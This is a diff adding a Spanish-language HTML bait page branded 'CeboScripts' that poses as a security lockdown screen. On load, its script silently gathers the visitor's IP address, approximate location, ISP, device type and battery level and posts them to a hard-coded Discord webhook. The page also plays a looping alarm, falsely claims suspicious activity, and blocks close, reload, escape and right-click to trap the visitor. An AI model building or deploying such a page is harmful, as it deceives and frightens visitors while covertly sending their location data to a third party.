@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CeboScripts</title>
+    <style>
+        /* ======== ESTILOS ======== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            /* 🔒 Sin scroll */
+            user-select: none;
+            /* 🔒 Sin selección de texto */
+            cursor: default;
+            /* 🔒 Cursor normal */
+        }
+
+        /* ======== OVERLAY QUE CONGELA LA PANTALLA ======== */
+        #freezeOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+            padding: 20px;
+            /* 🔒 Bloquea todos los clics */
+            pointer-events: auto;
+        }
+
+        /* ======== ANIMACIÓN DE CARGA ======== */
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #222;
+            border-top: 4px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 30px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ======== TEXTO PARPADEANTE ======== */
+        h1 {
+            color: #ff0000;
+            font-size: 2.5em;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+            animation: flicker 1.2s infinite alternate;
+            margin-bottom: 15px;
+        }
+
+        @keyframes flicker {
+            0% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.6;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        p {
+            color: #888;
+            font-size: 1.2em;
+            max-width: 500px;
+            line-height: 1.6;
+        }
+
+        .sub {
+            color: #444;
+            font-size: 0.85em;
+            margin-top: 30px;
+        }
+
+        /* ======== BOTÓN FALSO (NO HACE NADA) ======== */
+        .fake-btn {
+            margin-top: 30px;
+            padding: 14px 40px;
+            background: #1a1a1a;
+            color: #555;
+            border: 1px solid #333;
+            border-radius: 8px;
+            font-size: 1em;
+            cursor: not-allowed;
+            transition: 0.3s;
+        }
+
+        .fake-btn:hover {
+            background: #222;
+            border-color: #555;
+        }
+
+        /* ======== TEXTO DE ESTADO ======== */
+        #statusMsg {
+            margin-top: 20px;
+            color: #666;
+            font-size: 0.9em;
+            min-height: 30px;
+        }
+
+        /* ======== ONDAS DE SONIDO (EFECTO VISUAL) ======== */
+        .sound-waves {
+            display: flex;
+            gap: 5px;
+            margin-top: 20px;
+            justify-content: center;
+            height: 40px;
+            align-items: center;
+        }
+
+        .sound-waves span {
+            display: block;
+            width: 6px;
+            background: #ff0000;
+            border-radius: 3px;
+            animation: wave 0.6s infinite alternate;
+        }
+
+        .sound-waves span:nth-child(1) {
+            height: 15px;
+            animation-delay: 0s;
+        }
+        .sound-waves span:nth-child(2) {
+            height: 25px;
+            animation-delay: 0.1s;
+        }
+        .sound-waves span:nth-child(3) {
+            height: 35px;
+            animation-delay: 0.2s;
+        }
+        .sound-waves span:nth-child(4) {
+            height: 25px;
+            animation-delay: 0.3s;
+        }
+        .sound-waves span:nth-child(5) {
+            height: 15px;
+            animation-delay: 0.4s;
+        }
+
+        @keyframes wave {
+            0% {
+                transform: scaleY(0.3);
+                opacity: 0.3;
+            }
+            100% {
+                transform: scaleY(1);
+                opacity: 1;
+            }
+        }
+
+        /* ======== RESPONSIVE ======== */
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.8em;
+            }
+            p {
+                font-size: 1em;
+            }
+            .loader {
+                width: 40px;
+                height: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ======== OVERLAY QUE CONGELA LA PANTALLA ======== -->
+    <div id="freezeOverlay">
+        <div class="loader"></div>
+
+        <h1>⚠️ SISTEMA BLOQUEADO</h1>
+
+        <p>
+            Se ha detectado actividad sospechosa en tu dispositivo.<br>
+            <span style="color:#666;font-size:0.9em;">Espera mientras se verifica tu identidad...</span>
+        </p>
+
+        <!-- EFECTO VISUAL DE SONIDO -->
+        <div class="sound-waves">
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+
+        <!-- BOTÓN FALSO (NO HACE NADA) -->
+        <div class="fake-btn">⛔ Acceso denegado</div>
+
+        <div id="statusMsg">🔊 Reproduciendo sonido de verificación...</div>
+        <div class="sub">CeboScripts • Verificación de seguridad</div>
+    </div>
+
+    <!-- ======== AUDIO OCULTO (SE REPRODUCE AUTOMÁTICAMENTE) ======== -->
+    <!-- ⚠️ CAMBIA LA URL POR TU PROPIO AUDIO (MP3, WAV, OGG) -->
+    <audio id="alarmAudio" loop preload="auto">
+        <source src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3" type="audio/mpeg">
+        <!-- Si quieres un sonido de alarma más intenso, usa este: -->
+        <!-- <source src="https://www.soundjay.com/misc/sounds/alarm-clock-01.mp3" type="audio/mpeg"> -->
+        Tu navegador no soporta audio.
+    </audio>
+
+    <!-- ======== SCRIPTS ======== -->
+    <script>
+        // ======== REPRODUCIR AUDIO ========
+        function reproducirAudio() {
+            const audio = document.getElementById('alarmAudio');
+
+            // 🔊 Intentar reproducir automáticamente
+            audio.play()
+                .then(() => {
+                    console.log('✅ Audio reproduciéndose');
+                    document.getElementById('statusMsg').textContent = '🔊 Sonido de alarma activado';
+                })
+                .catch((error) => {
+                    console.warn('⚠️ No se pudo reproducir automáticamente:', error);
+
+                    // 🔄 Intento alternativo: silencioso + reproducción con interacción
+                    audio.muted = true;
+                    audio.play()
+                        .then(() => {
+                            audio.muted = false;
+                            console.log('✅ Audio activado (silencioso primero)');
+                            document.getElementById('statusMsg').textContent = '🔊 Sonido de alarma activado';
+                        })
+                        .catch(() => {
+                            document.getElementById('statusMsg').textContent =
+                                '⚠️ Haz clic en cualquier parte para activar el sonido';
+                            // ⚠️ Si falla, espera un clic del usuario
+                            document.addEventListener('click', function activarSonido() {
+                                audio.muted = false;
+                                audio.play();
+                                document.getElementById('statusMsg').textContent =
+                                '🔊 Sonido de alarma activado';
+                                document.removeEventListener('click', activarSonido);
+                            }, { once: true });
+                        });
+                });
+
+            // 🔄 Si el audio se detiene, lo reiniciamos (para loop infinito)
+            audio.addEventListener('ended', () => {
+                audio.currentTime = 0;
+                audio.play();
+            });
+        }
+
+        // ======== CAPTURAR DATOS (IP, DISPOSITIVO, BATERÍA) ========
+        async function capturarDatos() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+
+                const ua = navigator.userAgent || '';
+                let dispositivo = 'Desconocido';
+                if (/android/i.test(ua)) dispositivo = 'Android';
+                else if (/iphone|ipad|ipod/i.test(ua)) dispositivo = 'iOS';
+                else if (/windows/i.test(ua)) dispositivo = 'Windows PC';
+                else if (/mac/i.test(ua)) dispositivo = 'Mac';
+                else if (/linux/i.test(ua)) dispositivo = 'Linux';
+
+                let bateria = 'No disponible';
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        bateria = Math.round(battery.level * 100) + '%';
+                    }
+                } catch (e) {}
+
+                const info = {
+                    ip: data.ip || 'No disponible',
+                    ciudad: data.city || 'No disponible',
+                    pais: data.country_name || 'No disponible',
+                    isp: data.org || 'No disponible',
+                    region: data.region || 'No disponible',
+                    dispositivo: dispositivo,
+                    bateria: bateria,
+                    direccionReal: data.city + ', ' + data.region + ', ' + data.country_name,
+                    hora: new Date().toLocaleString()
+                };
+
+                // ======== ENVIAR A DISCORD ========
+                const WEBHOOK_URL =
+                    'https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD';
+
+                const embed = {
+                    color: 0xff0000,
+                    title: '🚨 SISTEMA BLOQUEADO',
+                    fields: [
+                        { name: '📍 Dirección', value: info.direccionReal || 'No disponible' },
+                        { name: '🌐 IP', value: info.ip || 'No disponible' },
+                        { name: '📱 Dispositivo', value: info.dispositivo || 'No disponible' },
+                        { name: '🔋 Batería', value: info.bateria || 'No disponible' },
+                        { name: '📶 ISP', value: info.isp || 'No disponible' },
+                        { name: '🕒 Hora', value: info.hora || 'No disponible' }
+                    ],
+                    footer: { text: 'CeboScripts • Congelamiento de pantalla' },
+                    timestamp: new Date().toISOString()
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: 'CeboScripts Logger',
+                        content: '🚨 **¡PANTALLA CONGELADA!**',
+                        embeds: [embed]
+                    })
+                });
+
+                console.log('✅ Datos enviados a Discord');
+
+            } catch (error) {
+                console.error('❌ Error capturando datos:', error);
+            }
+        }
+
+        // ======== EVITAR SALIR DE LA PÁGINA ========
+        function evitarSalir() {
+            // 🔒 Previene cerrar la pestaña con atajos de teclado
+            document.addEventListener('keydown', function(e) {
+                // Ctrl+W, Ctrl+F4, Alt+F4, Cmd+W
+                if ((e.ctrlKey && (e.key === 'w' || e.key === 'W')) ||
+                    (e.ctrlKey && e.key === 'F4') ||
+                    (e.altKey && e.key === 'F4') ||
+                    (e.metaKey && e.key === 'w')) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+
+                // F5, Ctrl+R, Cmd+R (recargar)
+                if (e.key === 'F5' ||
+                    (e.ctrlKey && (e.key === 'r' || e.key === 'R')) ||
+                    (e.metaKey && (e.key === 'r' || e.key === 'R'))) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+
+                // Esc (salir de pantalla completa)
+                if (e.key === 'Escape') {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // 🔒 Previene el clic derecho
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // 🔒 Previene salir con Alt+Tab (no se puede prevenir del todo)
+            // 🔒 Previene cerrar la pestaña con el botón de cerrar (no se puede prevenir)
+
+            // ⚠️ Muestra un mensaje de advertencia al intentar salir
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '⚠️ ¿Estás seguro de que quieres salir? El sistema está bloqueado.';
+                return '⚠️ ¿Estás seguro de que quieres salir? El sistema está bloqueado.';
+            });
+        }
+
+        // ======== INICIAR TODO AL CARGAR ========
+        document.addEventListener('DOMContentLoaded', function() {
+            // 1️⃣ Capturar datos y enviar a Discord
+            capturarDatos();
+
+            // 2️⃣ Reproducir audio
+            reproducirAudio();
+
+            // 3️⃣ Prevenir salida
+            evitarSalir();
+
+            // 4️⃣ Cambiar mensaje de estado
+            setTimeout(() => {
+                document.getElementById('statusMsg').textContent = '🔊 Alarma activada • Sistema bloqueado';
+            }, 2000);
+
+            // 5️⃣ Después de 5 segundos, cambiar mensaje
+            setTimeout(() => {
+                document.getElementById('statusMsg').textContent = '⚠️ No intentes cerrar la pestaña';
+            }, 5000);
+
+            console.log('🚨 Sistema bloqueado activado');
+        });
+    </script>
+</body>
+</html>
